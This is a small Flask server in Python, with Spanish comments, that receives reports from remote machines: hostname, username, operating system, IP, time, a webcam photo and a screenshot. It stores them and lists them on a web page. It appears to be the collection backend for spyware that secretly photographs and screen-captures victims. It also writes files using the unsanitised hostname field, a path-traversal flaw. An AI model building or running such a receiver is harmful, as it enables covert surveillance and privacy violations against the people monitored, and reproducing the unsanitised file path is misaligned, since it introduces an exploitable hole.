from flask import Flask, request, render_template
import os
from datetime import datetime

app = Flask(__name__)

# Crear carpeta para guardar imágenes si no existe
UPLOAD_FOLDER = os.path.join("static", "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Lista global para almacenar reportes
reportes = []

@app.route('/', methods=['GET'])
def index():
    return render_template("index.html", reports=reportes)

@app.route('/report', methods=['POST'])
def report():
    data = request.form

    hostname = data.get('hostname', 'No recibido')
    usuario = data.get('usuario', 'No recibido')
    sistema = data.get('sistema', 'No recibido')
    ip = data.get('ip', 'No recibido')
    hora = data.get('hora', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    # Guardar imágenes si están presentes
    webcam_path = None
    pantalla_path = None

    if 'imagen_webcam' in request.files:
        file = request.files['imagen_webcam']
        if file.filename:
            webcam_path = os.path.join(UPLOAD_FOLDER, f"{hostname}_webcam.jpg")
            file.save(webcam_path)

    if 'captura_pantalla' in request.files:
        file = request.files['captura_pantalla']
        if file.filename:
            pantalla_path = os.path.join(UPLOAD_FOLDER, f"{hostname}_pantalla.jpg")
            file.save(pantalla_path)

    # Guardar el reporte
    reporte = {
        'hostname': hostname,
        'usuario': usuario,
        'sistema': sistema,
        'ip': ip,
        'hora': hora,
        'webcam': webcam_path,
        'pantalla': pantalla_path
    }

    reportes.insert(0, reporte)
    print("Reporte recibido:", reporte)

    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
